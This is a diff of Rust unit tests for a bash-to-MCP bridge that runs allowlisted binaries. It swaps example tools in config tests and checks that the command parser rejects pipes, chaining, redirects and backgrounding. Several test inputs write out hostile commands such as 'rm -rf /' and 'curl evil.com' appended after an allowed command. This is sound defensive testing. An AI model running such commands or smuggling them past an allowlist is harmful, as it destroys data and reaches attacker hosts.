@@ -13,7 +13,7 @@ port = 8741
 timeout = 120
 
 [allowed]
-bins = ["gog", "uv"]
+bins = ["gh", "obsidian"]
 "#;
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
@@ -22,14 +22,14 @@ bins = ["gog", "uv"]
         assert_eq!(config.server.host, "127.0.0.1");
         assert_eq!(config.server.port, 8741);
         assert_eq!(config.server.timeout, 120);
-        assert_eq!(config.allowed.bins, vec!["gog", "uv"]);
+        assert_eq!(config.allowed.bins, vec!["gh", "obsidian"]);
     }
 
     #[test]
     fn test_parse_config_defaults() {
         let toml_content = r#"
 [allowed]
-bins = ["gog"]
+bins = ["gh"]
 "#;
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
@@ -61,28 +61,28 @@ mod reload_tests {
     fn test_config_reload_updates_bins() {
         let toml_content = r#"
 [allowed]
-bins = ["gog"]
+bins = ["gh"]
 "#;
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
 
         let store = bash_mcp_bridge::config::ConfigStore::new(Some(f.path()), vec![]).unwrap();
-        assert_eq!(store.snapshot().allowed.bins, vec!["gog"]);
+        assert_eq!(store.snapshot().allowed.bins, vec!["gh"]);
 
         let new_content = r#"
 [allowed]
-bins = ["gog", "uv", "cargo"]
+bins = ["gh", "obsidian", "cargo"]
 "#;
         std::fs::write(f.path(), new_content).unwrap();
         store.reload().unwrap();
-        assert_eq!(store.snapshot().allowed.bins, vec!["gog", "uv", "cargo"]);
+        assert_eq!(store.snapshot().allowed.bins, vec!["gh", "obsidian", "cargo"]);
     }
 
     #[test]
     fn test_config_reload_preserves_allow_overrides() {
         let toml_content = r#"
 [allowed]
-bins = ["gog"]
+bins = ["gh"]
 "#;
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
@@ -104,46 +104,46 @@ bins = ["curl"]
 mod executor_tests {
     #[test]
     fn test_parse_simple_command() {
-        let parsed = bash_mcp_bridge::executor::parse_command("gog calendar events foo").unwrap();
-        assert_eq!(parsed.binary, "gog");
-        assert_eq!(parsed.args, vec!["calendar", "events", "foo"]);
+        let parsed = bash_mcp_bridge::executor::parse_command("gh pr list --json number").unwrap();
+        assert_eq!(parsed.binary, "gh");
+        assert_eq!(parsed.args, vec!["pr", "list", "--json", "number"]);
     }
 
     #[test]
     fn test_parse_command_with_quotes() {
         let parsed = bash_mcp_bridge::executor::parse_command(
-            r#"gog calendar create foo --summary "My Event""#,
+            r#"gh issue create --title "My Issue" --body "description""#,
         )
         .unwrap();
-        assert_eq!(parsed.binary, "gog");
+        assert_eq!(parsed.binary, "gh");
         assert_eq!(
             parsed.args,
-            vec!["calendar", "create", "foo", "--summary", "My Event"]
+            vec!["issue", "create", "--title", "My Issue", "--body", "description"]
         );
     }
 
     #[test]
     fn test_reject_pipe() {
-        let result = bash_mcp_bridge::executor::parse_command("gog events | grep foo");
+        let result = bash_mcp_bridge::executor::parse_command("gh pr list | grep foo");
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("shell token"));
     }
 
     #[test]
     fn test_reject_semicolon() {
-        let result = bash_mcp_bridge::executor::parse_command("gog events; rm -rf /");
+        let result = bash_mcp_bridge::executor::parse_command("gh pr list; rm -rf /");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_and_chain() {
-        let result = bash_mcp_bridge::executor::parse_command("gog events && curl evil.com");
+        let result = bash_mcp_bridge::executor::parse_command("gh pr list && curl evil.com");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_or_chain() {
-        let result = bash_mcp_bridge::executor::parse_command("gog events || curl evil.com");
+        let result = bash_mcp_bridge::executor::parse_command("gh pr list || curl evil.com");
         assert!(result.is_err());
     }
 
@@ -163,13 +163,13 @@ mod executor_tests {
 
     #[test]
     fn test_reject_redirect() {
-        let result = bash_mcp_bridge::executor::parse_command("gog events > /tmp/out");
+        let result = bash_mcp_bridge::executor::parse_command("gh pr list > /tmp/out");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_background() {
-        let result = bash_mcp_bridge::executor::parse_command("gog events &");
+        let result = bash_mcp_bridge::executor::parse_command("gh pr list &");
         assert!(result.is_err());
     }
 
